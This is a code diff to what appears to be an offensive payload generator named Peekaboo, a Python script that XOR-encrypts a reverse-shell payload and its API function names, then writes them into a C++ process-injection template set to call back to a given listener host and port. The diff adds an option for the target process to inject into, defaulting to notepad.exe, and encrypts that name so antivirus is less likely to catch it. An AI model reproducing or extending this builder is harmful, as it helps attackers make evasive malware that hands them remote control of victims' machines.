@@ -22,12 +22,16 @@ class PeekabooEncryptor():
     def __init__(self):
         self.XOR_PAYLOAD = self.random()
         self.XOR_FUNC = self.random()
+        self.XOR_PROC = self.random()
 
     def payload_key(self):
         return self.XOR_PAYLOAD
 
     def func_key(self):
         return self.XOR_FUNC
+
+    def proc_key(self):
+        return self.XOR_PROC
 
     def xor(self, data, key):
         key = str(key)
@@ -66,7 +70,7 @@ def generate_payload(host, port):
         print (Colors.RED + "generate payload failed :(" + Colors.ENDC)
         sys.exit()
 
-def run_peekaboo(host, port):
+def run_peekaboo(host, port, proc_name):
     banner = """
     #####  ###### #    #         ##         #####   ####   ####  
     #    # #      #   #         #  #        #    # #    # #    # 
@@ -106,6 +110,7 @@ def run_peekaboo(host, port):
     ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
     ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
     ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
+    ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
 
     tmp = open("peekaboo_inj.cpp", "rt")
     data = tmp.read()
@@ -119,8 +124,10 @@ def run_peekaboo(host, port):
     data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
     data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
     data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
+    data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
 
     data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
+    data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
     data = data.replace('char f_key[] = "";', 'char f_key[] = "' + vaex_key + '";')
     data = data.replace('XOR(', f_xor + "(")
 
@@ -144,6 +151,8 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser()
     parser.add_argument('-l','--lhost', required = True, help = "local IP")
     parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
+    parser.add_argument('-e', '--proc', required = True, help = "process name", default = "notepad.exe")
     args = vars(parser.parse_args())
     host, port = args['lhost'], args['lport']
-    run_peekaboo(host, port)
+    proc_name = args['proc']
+    run_peekaboo(host, port, proc_name)
